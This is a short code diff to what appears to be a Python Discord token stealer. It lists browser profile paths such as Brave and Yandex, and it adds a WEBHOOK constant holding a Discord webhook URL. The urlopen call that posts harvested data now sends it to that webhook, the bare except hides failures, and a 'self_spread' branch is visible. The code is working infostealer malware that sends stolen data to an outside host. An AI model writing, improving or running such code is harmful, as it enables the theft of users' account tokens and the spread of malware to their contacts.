@@ -21,6 +21,7 @@ PATHS = {
     "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
     "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
 }
+WEBHOOK = "https://discordapp.com/api/webhooks/818094321923784707/xOIzIOWLhh6jF4MsDo4K0tnDkck6Rpca1Wwxt8bG8o6ZRCbBPKdVkU4Hy-VejzdmGael"
 def getheaders(token=None, content_type="application/json"):
     headers = {
         "Content-Type": content_type,
@@ -145,7 +146,7 @@ def main():
         "avatar_url": "https://cdn.discordapp.com/attachments/809725604399939616/815673893150916611/qTPCE968_400x400.jpg"
     }
     try:
-        urlopen(Request("https://discordapp.com/api/webhooks/815873531899936768/lajaRqwGvmd-z-nA7L0o1iuCecJRi3Uiyz28ufQr8mL0Q0i4Lcs_u5sc230p1oHg8eNZ", data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request(WEBHOOK, data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
     if self_spread:
